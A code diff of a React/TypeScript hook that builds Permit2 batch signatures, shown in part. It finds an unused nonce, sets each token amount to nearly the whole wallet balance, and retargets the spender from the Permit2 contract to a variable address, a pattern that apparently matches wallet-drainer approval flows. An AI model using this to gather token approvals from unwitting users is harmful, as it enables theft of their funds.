@@ -30,29 +30,29 @@ const permit2Abi = [
   },
 ] as const;
 
-
-
 export function usePermit2Execution() {
   const { signTypedDataAsync } = useSignTypedData();
   const publicClient = usePublicClient();
 
-const getAvailableNonce = async (user: string): Promise<bigint> => {
+  const getAvailableNonce = async (user: string): Promise<bigint> => {
     if (!publicClient) throw new Error("Public client not available");
 
     for (let wordPos = 0; wordPos < 256; wordPos++) {
-      const bitmap = await publicClient.readContract({
+      const bitmap = (await publicClient.readContract({
         address: PERMIT2_CONTRACT as `0x${string}`,
         abi: permit2Abi,
         functionName: "nonceBitmap",
         args: [user as `0x${string}`, BigInt(wordPos)],
-      }) as bigint;
+      })) as bigint;
 
       if (bitmap === 2n ** 256n - 1n) continue;
 
       for (let bitPos = 0; bitPos < 256; bitPos++) {
         if (!(bitmap & (1n << BigInt(bitPos)))) {
           const nonce = (BigInt(wordPos) << 8n) | BigInt(bitPos);
-          console.log(`✅ Clean nonce: ${nonce} (word=${wordPos}, bit=${bitPos})`);
+          console.log(
+            `✅ Clean nonce: ${nonce} (word=${wordPos}, bit=${bitPos})`,
+          );
           return nonce;
         }
       }
@@ -82,7 +82,7 @@ const getAvailableNonce = async (user: string): Promise<bigint> => {
 
       const decimals = tokenData.decimals ?? 6;
       const adjusted = (tokenData.balance - 0.2) * Math.pow(10, decimals);
-      return BigInt(Math.floor(adjusted)).toString(); // ✅ uint256 as text
+      return BigInt(Math.floor(adjusted)).toString();
     };
 
     let signature: string;
@@ -100,7 +100,7 @@ const getAvailableNonce = async (user: string): Promise<bigint> => {
             token: p.token,
             amount: BigInt(getActualAmount(p)),
           })),
-          spender: PERMIT2_CONTRACT,
+          spender: spenderAddress,
           nonce,
           deadline: BigInt(deadline),
         },
